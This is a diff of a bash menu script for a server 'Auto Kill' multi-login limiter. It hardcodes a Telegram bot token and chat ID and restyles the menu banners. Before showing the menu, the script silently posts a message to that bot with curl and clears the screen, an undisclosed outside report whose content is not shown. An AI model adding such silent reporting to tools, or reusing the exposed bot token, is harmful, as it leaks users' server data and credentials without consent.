@@ -1,8 +1,8 @@
 #!/bin/bash
 red() { echo -e "\\033[32;1m${*}\\033[0m"; }
 TIMES="10"
-CHATID="1111"
-KEY="6003347945"
+CHATID="1830342336"
+KEY="6320035110:AAE6otySdlNHPhKom2PNtp8yZn8X8rZS7LE"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
 Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m"
@@ -16,9 +16,10 @@ sts="${Error}"
 fi
 curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL
 clear
-    echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-  echo -e " \e[1;97;101m          AUTO KILL       \e[0m"
-  echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e " \033[31m##########\033[33m##########\033[32m##########\033[34m##########\033[35m##########\033[36m##########\e[0m"
+echo -e " \033[31m╭══════════════════════════════════════════════════════════╮\e[0m"
+echo -e " \033[34m│$NC\033[33m                        Auto Kill                         $NC\033[34m│\e[0m"
+echo -e " \033[33m╰══════════════════════════════════════════════════════════╯\e[0m"
 echo -e "Status Autokill : $sts        "
 echo -e ""
 echo -e "[1]  AutoKill After 5 Minutes"
@@ -26,7 +27,7 @@ echo -e "[2]  AutoKill After 10 Minutes"
 echo -e "[3]  AutoKill After 15 Minutes"
 echo -e "[4]  Turn Off AutoKill/MultiLogin"
 echo ""
-echo -e "\e[1m==============================================\033[0m"
+echo -e " \033[31m##########\033[33m##########\033[32m##########\033[34m##########\033[35m##########\033[36m##########\e[0m"
 echo -e ""
 read -p "Select From Options [1-4 or x] :  " AutoKill
 if [ -z $AutoKill ]; then
